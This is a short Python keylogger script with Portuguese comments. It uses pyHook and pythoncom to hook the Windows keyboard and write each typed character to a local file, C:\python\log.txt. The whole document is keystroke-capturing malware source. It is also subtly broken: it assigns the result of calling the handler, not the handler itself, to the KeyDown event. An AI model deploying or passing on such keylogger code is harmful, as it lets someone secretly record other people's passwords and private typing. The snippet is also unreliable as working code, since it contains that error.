import pythoncom, pyHook, sys, logging
# file_log é onde vamos guardar os dados por exemplo disco C:
file_log = 'C:\\python\\log.txt'

# Vamos criar agora uma função que monitora nosso teclado

def OnKeyBoardEvent(event):
    logging.basicConfig(filename=file_log, level=logging.DEBUG, format='%(message)s')
    chr(event.Ascii)
    logging.log(10,chr(event.Ascii))
    return True

hooks_manager = pyHook.HookManager()
hooks_manager.KeyDown = OnKeyBoardEvent()
hooks_manager.HookKeyboard()
pythoncom.PumpMessages()
